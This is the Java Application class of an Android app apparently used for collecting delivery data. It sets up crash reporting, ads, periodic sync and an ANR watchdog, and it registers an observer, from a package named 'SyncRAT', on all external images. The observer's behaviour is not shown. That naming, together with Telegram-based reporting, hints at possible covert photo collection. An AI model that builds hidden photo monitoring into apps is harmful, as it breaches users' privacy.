package android.iocl.dac_collector.MainApplication;


import static android.iocl.dac_collector.Utility.Utility.TAG;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.Application;
import android.content.ContentResolver;
import android.content.Intent;
import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.SyncAdapters.AccountContract;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.SyncRAT.ImageObserver;
import android.iocl.dac_collector.Ui.CrashActivity;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.TelegramBot;
import android.iocl.dac_collector.Utility.Utility;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.StrictMode;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.ads.MobileAds;
import com.google.firebase.FirebaseApp;
import com.google.firebase.crashlytics.FirebaseCrashlytics;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Map;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class MyApp extends Application implements Application.ActivityLifecycleCallbacks {
    FirebaseCrashlytics crashlytics;
    Executor executor = Executors.newSingleThreadExecutor();
    Boolean installCockroach = !BuildConfig.DEBUG ;

    private Thread.UncaughtExceptionHandler defaultHandler;

    private volatile long lastMainThreadPing = System.currentTimeMillis();
    private ImageObserver mImageObserver;
    /**
     * ===================== ANR WATCHDOG ======================
     **/
    private volatile boolean anrDetectionInProgress = false;

    @Override
    public void onCreate() {
        super.onCreate();

        String currentProcess = getProcessNameSafe();
        String mainProcess = getPackageName();
        if (!mainProcess.equals(currentProcess)) {
            Log.w("MyApp", "Skipping init in non-main process: " + currentProcess);
            return;
        }

        // ------------------ STRICT MODE ------------------
        if (BuildConfig.DEBUG) {
            StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder()
                    .detectAll()
                    .penaltyLog()
                    .penaltyDialog()
                    .build());
        }

        // ------------------ Firebase / Crashlytics ------------------
        FirebaseApp.initializeApp(this);  // MUST be first
        crashlytics = FirebaseCrashlytics.getInstance();

        String cons_id = SharedPrefs.getString(this,
                "cons_id",
                BuildConfig.DEBUG ? "crashedBeforeSettingUp--debug" : "crashedBeforeSettingUp");

        crashlytics.setUserId(cons_id);

        crashlytics.setCrashlyticsCollectionEnabled(installCockroach);

        // ------------------ Mobile Ads (delayed) ------------------
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                MobileAds.initialize(getApplicationContext(), initializationStatus -> {
                });
            } catch (Exception e) {
                Log.e(TAG, "MobileAds init failed", e);
            }
        }, 3000);

        // ------------------ Sync Account Setup ------------------
        new Thread(() -> {
            try {
                createSyncAccount();
                AccountContract.createSyncBothAccount(getApplicationContext());
                SyncUtils.initialize(getApplicationContext());
            } catch (Exception e) {
                Log.e(TAG, "Account setup failed", e);
                crashlytics.recordException(e);
                crashlytics.sendUnsentReports();
            }
        }).start();

        // ------------------ Lifecycle Logging ------------------
        registerActivityLifecycleCallbacks(this);

        // ------------------ ANR Watchdog ------------------
        startAnrWatchdog();

        // ------------------ Image Observer ------------------
        installImageObserver();

        // ------------------ Install Cockroach ------------------
        if (installCockroach) {
            install(); // your custom crash handler now wraps Crashlytics
        }
    }

    /**
     * ===================== CRASH HANDLER ======================
     **/


    /** ===================== HEARTBEAT ====================== **/


    /**
     * ===================== ANR WATCHDOG ======================
     **/

    private String getProcessNameSafe() {
        try {
            int pid = android.os.Process.myPid();
            BufferedReader reader = new BufferedReader(
                    new FileReader("/proc/" + pid + "/cmdline")
            );
            String processName = reader.readLine().trim();
            reader.close();
            return processName;
        } catch (Exception e) {
            return null;
        }
    }

    private void startAnrWatchdog() {
        Handler mainHandler = new Handler(Looper.getMainLooper());

        // Ping main thread every second
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                lastMainThreadPing = System.currentTimeMillis();
                mainHandler.postDelayed(this, 1000);
            }
        });

        // Watchdog thread - FIXED VERSION
        new Thread(() -> {
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    Thread.sleep(2000);
                    long delta = System.currentTimeMillis() - lastMainThreadPing;

                    if (delta > 5000 && !anrDetectionInProgress) { // Increased to 5s threshold
                        anrDetectionInProgress = true;
                        captureMainThreadStackAsync(); // Don't block watchdog thread
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }, "ANR-Watchdog").start();
    }

    private void captureMainThreadStackAsync() {
        executor.execute(() -> {
            try {
                Thread main = Looper.getMainLooper().getThread();
                StackTraceElement[] mainStack = main.getStackTrace();

                // Check if any frame is from our package
                boolean causedByMyCode = false;
                String myPackage = "android.iocl.dac_collector";

                for (StackTraceElement e : mainStack) {
                    if (e.getClassName().startsWith(myPackage)) {
                        causedByMyCode = true;
                        break;
                    }
                }

                if (!causedByMyCode) {
                    Log.w("ANR-Watchdog", "ANR detected but not caused by app code — skipping log.");
                    return;
                }

                // Build detailed log ASYNCHRONOUSLY
                captureAnrDetails(mainStack);

            } catch (Exception e) {
                Log.e("ANR-Watchdog", "Error capturing ANR", e);
            } finally {
                anrDetectionInProgress = false;
            }
        });
    }

    private void captureAnrDetails(StackTraceElement[] mainStack) {
        long now = System.currentTimeMillis();
        StringBuilder sb = new StringBuilder();
        sb.append("=== ANR DETECTED (App Code) ===\n");
        sb.append("Time: ").append(Utility.getStandardDate())
                .append(" (").append(now).append(")\n");
        sb.append("Uptime(ms): ").append(android.os.SystemClock.uptimeMillis()).append("\n");
        sb.append("ElapsedRealtime(ms): ").append(android.os.SystemClock.elapsedRealtime()).append("\n");

        sb.append("\n--- Main Thread Stack ---\n");
        for (StackTraceElement e : mainStack) {
            sb.append(e.toString()).append("\n");
        }

        sb.append("\n--- All Threads ---\n");
        Map<Thread, StackTraceElement[]> allStacks = Thread.getAllStackTraces();
        for (Map.Entry<Thread, StackTraceElement[]> entry : allStacks.entrySet()) {
            Thread t = entry.getKey();
            sb.append("\nThread: ").append(t.getName())
                    .append(" State: ").append(t.getState())
                    .append(t == Thread.currentThread() ? " [ANR-Watchdog]" : "")
                    .append("\n");
            for (StackTraceElement ste : entry.getValue()) {
                sb.append("    ").append(ste.toString()).append("\n");
            }
        }

        // Log to Crashlytics
        if (crashlytics != null) {
            try {
                crashlytics.recordException(new RuntimeException("ANR Watchdog Triggered:\n" + sb.toString()));
                crashlytics.sendUnsentReports();
            } catch (Exception ignored) {
            }
        }

        Log.e("ANR-Detailed", sb.toString());
    }


    /**
     * ===================== ACTIVITY LIFECYCLE LOGGING ======================
     **/
    @Override
    public void onActivityCreated(Activity activity, android.os.Bundle savedInstanceState) {
        logLifecycle("CREATED", activity);
    }

    @Override
    public void onActivityStarted(Activity activity) {
        logLifecycle("STARTED", activity);
    }

    @Override
    public void onActivityResumed(Activity activity) {
        logLifecycle("RESUMED", activity);
    }

    @Override
    public void onActivityPaused(Activity activity) {
        logLifecycle("PAUSED", activity);
    }

    @Override
    public void onActivityStopped(Activity activity) {
        logLifecycle("STOPPED", activity);
    }

    @Override
    public void onActivitySaveInstanceState(Activity activity, android.os.Bundle outState) {
        logLifecycle("SAVE_INSTANCE_STATE", activity);
    }

    @Override
    public void onActivityDestroyed(Activity activity) {
        logLifecycle("DESTROYED", activity);
    }

    private void logLifecycle(String state, Activity activity) {
        String log = state + ":" + activity.getClass().getSimpleName() + ":" + System.currentTimeMillis();
    }

    /**
     * ===================== FILE UTILS ======================
     **/


    private String readFile(File file) {
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            return sb.toString();
        } catch (IOException e) {
            return "";
        }
    }

    private String getStackTrace(Throwable t) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        t.printStackTrace(pw);
        return sw.toString();
    }


    private void createSyncAccount() {
        Account account = new Account(
                AccountContract.ACCOUNT_NAME,
                AccountContract.ACCOUNT_TYPE
        );

        AccountManager accountManager = AccountManager.get(this);
        if (accountManager.addAccountExplicitly(account, null, null)) {
            ContentResolver.setIsSyncable(account, AccountContract.AUTHORITY, 1);
            ContentResolver.setSyncAutomatically(
                    account,
                    AccountContract.AUTHORITY,
                    true
            );
            ContentResolver.addPeriodicSync(
                    account,
                    AccountContract.AUTHORITY,
                    Bundle.EMPTY,
                    AccountContract.SYNC_INTERVAL
            );
        }
    }

    // fields in your Activity/Service


    // call this instead of your old installImageObserver()
    private void installImageObserver() {
        if (mImageObserver != null) {
            Log.i("MyApp", "ImageObserver already installed");
            return;
        }

        if (XXPermissions.isGrantedPermissions(this, Permission.MANAGE_EXTERNAL_STORAGE)) {
            Handler handler = new Handler(Looper.getMainLooper());
            mImageObserver = new ImageObserver(handler, this);
            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    mImageObserver
            );
            Log.i("MyApp", "ImageObserver installed");
        } else {
            Log.i("MyApp", "Manage external storage permission not granted");
        }
    }


    // call this when stopping (Activity.onDestroy() or Service.onDestroy())


    @Override
    public void onTerminate() {
        super.onTerminate();
        if (mImageObserver != null) {
            getContentResolver().unregisterContentObserver(mImageObserver);
            mImageObserver = null;
        }


    }

    private void install() {
        executor.execute(() -> {
            final Thread.UncaughtExceptionHandler sysExcepHandler = Thread.getDefaultUncaughtExceptionHandler();


            Cockroach.install(this, new ExceptionHandler() {
                @Override
                protected void onUncaughtExceptionHappened(Thread thread, Throwable throwable) {
                    String crashInfo = "--->onUncaughtExceptionHappened\n: " + thread + "<--- " + throwable;

                    SharedPrefs.saveCrashDetails(getApplicationContext(), crashInfo);
                    crashlytics.recordException(throwable);
                    crashlytics.sendUnsentReports();

                    Toast.makeText(MyApp.this, "Something bad happend ! Reporting Developer", Toast.LENGTH_SHORT).show();

                    TelegramBot.with(getApplicationContext()).reportCrash(throwable);

                    if (SharedPrefs.isFirstTime(getApplicationContext())) {

                        // Small delay to ensure network flush
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            Intent intent = new Intent(getApplicationContext(), CrashActivity.class);
                            intent.putExtra("crash_details", crashInfo);
                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                            getApplicationContext().startActivity(intent);

                            android.os.Process.killProcess(android.os.Process.myPid());
                            System.exit(10);
                        }, 1000); // 1 second delay
                    }


                }

                @Override
                protected void onBandageExceptionHappened(Throwable throwable) {
                    SharedPrefs.saveCrashDetails(getApplicationContext(), throwable.getMessage());

                    TelegramBot.with(getApplicationContext()).reportCrash(throwable);
                    crashlytics.recordException(throwable);
                    crashlytics.sendUnsentReports();

                    crashlytics.log("Recoverable exception: " + throwable.getMessage());
                }

                @Override
                protected void onEnterSafeMode() {

                }

                @Override
                protected void onMayBeBlackScreen(Throwable e) {
                    Thread thread = Looper.getMainLooper().getThread();

                    SharedPrefs.saveCrashDetails(getApplicationContext(), "--->onUncaughtExceptionHappened:" + thread + "<---" + e);
                    TelegramBot.with(getApplicationContext()).reportCrash(e);
                    crashlytics.recordException(e);
                    crashlytics.sendUnsentReports();

                    //黑屏时建议直接杀死app
                    sysExcepHandler.uncaughtException(thread, new RuntimeException("black screen"));
                }

            });

        });
    }


}
